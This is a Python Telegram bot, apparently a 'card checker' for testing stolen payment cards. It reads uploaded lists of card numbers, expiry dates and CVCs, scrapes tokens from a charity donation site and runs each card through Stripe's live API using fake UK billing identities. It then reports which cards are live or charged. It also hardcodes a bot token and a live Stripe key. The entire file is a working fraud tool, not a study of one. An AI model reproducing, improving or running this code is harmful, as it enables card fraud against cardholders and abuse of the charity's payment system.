import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import requests as r
from fake_useragent import UserAgent
from datetime import datetime
from faker import Faker
from urllib.parse import quote_plus
import json
from bs4 import BeautifulSoup
import html

# Bot token - reads from environment variable or uses default for local testing
BOT_TOKEN = os.getenv("BOT_TOKEN", "8524420219:AAG6N_pHnNR3eqXO0gbRgMu_YCUbzU63Ijc")

# Global flag to stop processing
stop_flag = False

# Initialize session and faker
s = r.Session()
fake = Faker('en_GB')

def generate_fake_data():
    """Generate fake user data for billing"""
    first_name = fake.first_name()
    last_name = fake.last_name()
    address_1 = fake.street_address()
    city = fake.city()
    state = fake.random_element(elements=(
        'London', 'Manchester', 'Yorkshire', 'Essex', 
        'Kent', 'Lancashire', 'West Midlands', 'Glasgow',
        'Edinburgh', 'Birmingham', 'Liverpool', 'Bristol',
        'Sheffield', 'Leeds', 'Cardiff', 'Belfast',
        'Nottingham', 'Leicester', 'Coventry', 'Hull',
        'Newcastle', 'Brighton', 'Portsmouth', 'Southampton',
        'Norfolk', 'Suffolk', 'Devon', 'Cornwall',
        'Dorset', 'Somerset', 'Cheshire', 'Shropshire',
        'Derbyshire', 'Nottinghamshire', 'Lincolnshire',
        'Northumberland', 'Durham', 'Cumbria', 'North Yorkshire',
        'West Yorkshire', 'South Yorkshire', 'Merseyside',
        'Greater Manchester', 'West Midlands', 'Warwickshire',
        'Staffordshire', 'Hertfordshire', 'Buckinghamshire',
        'Oxfordshire', 'Gloucestershire', 'Cambridgeshire',
        'Worcestershire', 'Herefordshire', 'Bedfordshire',
        'Berkshire', 'Surrey', 'Sussex', 'Hampshire',
        'Isle of Wight', 'Wiltshire', 'Northamptonshire',
        'Rutland', 'Monmouthshire', 'Glamorgan', 'Gwent',
        'Dyfed', 'Powys', 'Gwynedd', 'Clwyd',
        'Strathclyde', 'Lothian', 'Grampian', 'Tayside',
        'Fife', 'Central', 'Borders', 'Dumfries and Galloway',
        'Highland', 'Islands', 'Antrim', 'Down',
        'Armagh', 'Londonderry', 'Tyrone', 'Fermanagh'
    ))
    postcode = fake.postcode()
    email = fake.email(domain='gmail.com')
    phone = fake.phone_number()
    
    return {
        'first_name': first_name,
        'last_name': last_name,
        'address_1': address_1,
        'city': city,
        'state': state,
        'postcode': postcode,
        'email': email,
        'phone': phone
    }

def check_card(card_data, fake_data):
    """Check a single card using the exact logic from 1.py"""
    try:
        parts = card_data.strip().split('|')
        if len(parts) != 4:
            return f"{card_data} >> Invalid format"
        
        n = parts[0]
        # bin3 = n[:6] # Not used in logic but present in original
        mm = parts[1]
        
        if int(mm) in [10, 11, 12]:
            mm = mm
        elif '0' not in mm:
            mm = f'0{mm}'
        else:
            mm = mm
            
        yy = parts[2]
        cvc = parts[3].replace('\n', '')
        P = card_data.replace('\n', '')
        
        if "20" not in yy:
            yy = f'20{yy}'
        else:
            yy = yy
            
        # Headers 1
        headers = {
            'authority': 'sdbfh.betterworld.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        response = s.get('https://sdbfh.betterworld.org/', headers=headers)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        config_div = soup.find('div', id='_bw_config')
        raw_data = html.unescape(config_div.text)
        config_json = json.loads(raw_data)
        csrf_meta = soup.find('meta', attrs={'name': 'csrf-token'})
        csrf_token = csrf_meta['content']
        auth_token = config_json['api_keys']['bwc']
        
        # Headers 2 & Setup Intent
        headers = {
            'authority': 'api.betterworld.org',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-auth-token': auth_token,
            'x-bw-src': 'l',
            'x-csrf-token': csrf_token
        }
        
        data = {
            'first_name': fake_data['first_name'],
            'last_name': fake_data['last_name'],
            'email': fake_data['email'],
            'payment_method_type': 'card',
            'is_widget': '0',
        }
        
        res1 = s.post('https://api.betterworld.org/v1/user-payments/setup-intents', cookies=s.cookies, headers=headers, data=data)
        
        seti = (res1.json()['data']['stripe_setup_intent_id'])
        client = (res1.json()['data']['stripe_setup_intent_client_secret'])
        
        # Headers 3 & Payment Method
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        # Exact data string from 1.py
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[address][line1]=Street+72838&billing_details[address][line2]=Apt&billing_details[address][city]=Hudson&billing_details[address][state]=NY&billing_details[name]=Spider+Man&billing_details[phone]=&payment_user_agent=stripe.js%2F5766238eed%3B+stripe-js-v3%2F5766238eed%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fsdbfh.betterworld.org&time_on_page=97274&client_attribution_metadata[client_session_id]=00715c43-ce48-45a8-9c86-2f5aca7d459b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=fe8047f8-7e48-40c8-9ad1-2a9ce07e715b&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=address&guid=06f7ab89-790e-4355-84b4-8ba5d036a3f6aa4625&muid=74bac138-02f3-4fd2-acff-68750288eb132930ce&sid=dbccc85f-27e3-4c2f-8376-7cca4baf3a7046d54b&key=pk_live_aGE2zfplg4kOqYZ4QWKOM9ah'
        
        res2 = s.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        pm = (res2.json()['id'])
        
        # Headers 4 & Confirm
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        # Exact confirm data from 1.py
        data = f'return_url=https%3A%2F%2Fsdbfh.betterworld.org%2Fdonate%3Fform_firstName%3DSpider%26form_lastName%3DMan%26form_email%3Dkskjdlsw%2540gmail.com%26form_amount%3D100%26form_dedication%3DKw%26form_wantsToCoverFees%3Dtrue%26form_shippingSameAsBilling%3Dtrue%26form_restore%3Dtrue&payment_method={pm}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_aGE2zfplg4kOqYZ4QWKOM9ah&client_attribution_metadata[client_session_id]=00715c43-ce48-45a8-9c86-2f5aca7d459b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=fe8047f8-7e48-40c8-9ad1-2a9ce07e715b&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=address&client_secret={client}'
        
        res3 = s.post(
            f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
            headers=headers,
            data=data,
        )
        
        # Return exact response format from 1.py
        if "card_declined" in res3.text:
            return f'{P} >> card_declined'
        elif "insufficient_funds" in res3.text:
            return f'{P} >> insufficient_funds'
        elif "expired_card" in res3.text:
            return f'{P} >> expired_card'
        elif "incorrect_cvc" in res3.text:
            return f'{P} >> incorrect_cvc'
        elif '"status": "succeeded"' in res3.text:
            return f'{P} >> LİVE ✅'
        elif "thank_you" in res3.text or "receipt" in res3.text:
            return f'{P} >> LIVE - CHARGED😈'
        elif "incorrect_number" in res3.text:
            return f'{P} >> incorrect_number'
        elif "requires_action" in res3.text:
            return f'{P} >> requires_action'
        else:
            return f"response / {res3.text}"
            
    except Exception as e:
        return f'{card_data} >> ⚠️ Error: {str(e)}'

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    await update.message.reply_text(
        '👋 Welcome to Card Checker Bot!\n\n'
        '📤 Send me a text file with card details (format: card|mm|yy|cvc)\n'
        '💬 Reply to the file with /txt to start checking\n'
        '🛑 Use /stop to stop the checking process'
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop the card checking process"""
    global stop_flag
    stop_flag = True
    await update.message.reply_text('🛑 Stopping the checking process...')

async def txt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process the text file when user replies with /txt"""
    global stop_flag
    stop_flag = False
    
    # Check if this is a reply to a message
    if not update.message.reply_to_message:
        await update.message.reply_text('❌ Please reply to a text file with /txt command!')
        return
    
    # Check if the replied message has a document
    if not update.message.reply_to_message.document:
        await update.message.reply_text('❌ Please reply to a text file!')
        return
    
    # Get the document
    document = update.message.reply_to_message.document
    
    # Check if it's a text file
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text('❌ Please send a .txt file!')
        return
    
    await update.message.reply_text('📥 Downloading file...')
    
    # Download the file
    file = await context.bot.get_file(document.file_id)
    file_path = f'temp_{document.file_name}'
    await file.download_to_drive(file_path)
    
    await update.message.reply_text('✅ File downloaded! Starting to check cards...\n\n'
                                   'Use /stop to stop the process.')
    
    # Read and process the file
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
        
        total_cards = len(lines)
        
        # Send initial stats message
        stats_msg = await update.message.reply_text(
            f'⏳ **Checking...**\n\n'
            f'📊 Total: {total_cards}\n'
            f'✅ Live: 0\n'
            f'😈 Charged: 0\n'
            f'❌ Declined: 0\n'
            f'💰 Insufficient: 0\n'
            f'🔢 CVC Error: 0\n'
            f'⚠️ Other: 0\n'
            f'📉 Checked: 0/{total_cards}'
        )
        
        checked = 0
        live = 0
        charged = 0
        declined = 0
        insufficient = 0
        cvc_error = 0
        other = 0
        
        for line in lines:
            if stop_flag:
                await update.message.reply_text('🛑 Checking stopped by user!')
                break
            
            line = line.strip()
            if not line:
                continue
            
            # Generate new fake data for each card
            fake_data = generate_fake_data()
            
            # Check the card
            result = check_card(line, fake_data)
            checked += 1
            
            # Categorize result
            should_send = False
            
            if 'LİVE' in result:
                live += 1
                should_send = True
            elif 'CHARGED' in result:
                charged += 1
                should_send = True
            elif 'insufficient_funds' in result:
                insufficient += 1
                should_send = True
            elif 'incorrect_cvc' in result:
                cvc_error += 1
                should_send = True
            elif 'card_declined' in result:
                declined += 1
            else:
                other += 1
            
            # Send message ONLY for specific results
            if should_send:
                # Add the devil emoji for charged
                if 'CHARGED' in result and '😈' not in result:
                    result = result.replace('CHARGED', 'CHARGED 😈')
                await update.message.reply_text(result)
            
            # Update stats every 5 cards or at the end to avoid flood limits
            if checked % 5 == 0 or checked == total_cards:
                try:
                    await stats_msg.edit_text(
                        f'⏳ **Checking...**\n\n'
                        f'📊 Total: {total_cards}\n'
                        f'✅ Live: {live}\n'
                        f'😈 Charged: {charged}\n'
                        f'❌ Declined: {declined}\n'
                        f'💰 Insufficient: {insufficient}\n'
                        f'🔢 CVC Error: {cvc_error}\n'
                        f'⚠️ Other: {other}\n'
                        f'📉 Checked: {checked}/{total_cards}'
                    )
                except Exception:
                    pass # Ignore edit errors
            
            # Small delay to avoid rate limiting
            await asyncio.sleep(1)
        
        # Final stats update
        try:
            await stats_msg.edit_text(
                f'✅ **Checking Complete!**\n\n'
                f'📊 Total: {total_cards}\n'
                f'✅ Live: {live}\n'
                f'😈 Charged: {charged}\n'
                f'❌ Declined: {declined}\n'
                f'💰 Insufficient: {insufficient}\n'
                f'🔢 CVC Error: {cvc_error}\n'
                f'⚠️ Other: {other}\n'
                f'📉 Checked: {checked}/{total_cards}'
            )
        except Exception:
            pass
        
        # Clean up
        os.remove(file_path)
        
    except Exception as e:
        await update.message.reply_text(f'⚠️ Error processing file: {str(e)}')
        if os.path.exists(file_path):
            os.remove(file_path)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle document uploads"""
    document = update.message.document
    
    if document.file_name.endswith('.txt'):
        await update.message.reply_text(
            '✅ Text file received!\n\n'
            '💬 Reply to this message with /txt to start checking the cards.'
        )
    else:
        await update.message.reply_text('❌ Please send a .txt file!')

def main():
    """Start the bot"""
    # Create the Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("txt", txt_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Start the bot
    print('🤖 Bot is running...')
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
